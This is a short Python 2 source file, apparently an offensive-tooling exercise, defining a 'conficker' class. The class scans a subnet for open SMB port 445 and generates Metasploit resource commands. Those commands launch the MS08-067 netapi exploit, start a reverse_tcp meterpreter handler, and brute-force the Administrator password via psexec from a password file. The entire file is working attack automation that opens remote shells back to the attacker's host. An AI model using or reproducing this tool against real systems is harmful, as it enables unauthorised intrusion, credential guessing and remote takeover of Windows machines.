import os
import sys
import nmap

class conficker():

    def __init__(self, outgoing, targets, outgoing_ports, cfg_file, password_file = None):
        self.LHOST = outgoing
        self.RHOSTS = targets
        self.LPORT = outgoing_ports
        self.password_file = password_file
        self.cfg = cfg_file

    def find_vulnerable_hosts(self, subnet):
        nscan = nmap.PortScanner()
        nscan.scan(subnet, '445')

        vulnerable_hosts = []

        for host in nscan.all_hosts():
            if nscan[host].has_tcp(445):
                port_state = nscan[host]['tcp'][445]['state']
                if port_state == 'open':
                    print '[+] Found Target Host: ' + host
                    vulnerable_hosts.append(host)

        return vulnerable_hosts

    def setup_exploit_file(self):
        self.cfg.write('use exploit/multi/handler\n')
        self.cfg.write('set payload ' +\
                  'windows/meterpreter/reverse_tcp\n')
        self.cfg.write('set LPORT ' + str(self.LPORT) + '\n')
        self.cfg.write('set LHOST ' + str(self.LHOST) + '\n')
        self.cfg.write('exploit -j -z\n')
        self.cfg.write('set DisablePayloadHandler 1\n')

    def setup_conficker_exploit(self):
        self.cfg.write('use exploit/windows/smb/ms08_067_netapi\n')
        self.cfg.write('set RHOST ' + str(self.RHOSTS) + '\n')
        self.cfg.write('set LHOST ' + str(self.LHOST) + '\n')
        self.cfg.write('set LPORT ' + str(self.LPORT) + '\n')
        self.cfg.write('exploit -j -z \n')

    def smb_brute(self):
        uname = 'Administrator'
        with open(self.password_file) as passwords:
            for password in passwords:
                self.cfg.write('use exploit/windows/smb/psexec\n')
                self.cfg.write('set SMBUser ' + str(uname) + '\n')
                self.cfg.write('set SMBPass ' + str(password) + '\n')
                self.cfg.write('set RHOST ' + str(self.RHOSTS) + '\n')
                self.cfg.write('set payload ' +\
                               'windows/meterpreter/reverse_tcp\n')
                self.cfg.write('set LPORT ' + str(self.LPORT) + '\n')
                self.cfg.write('set LHOST ' + str(self.LHOST) + '\n')
                self.cfg.write('exploit -j -z\n')

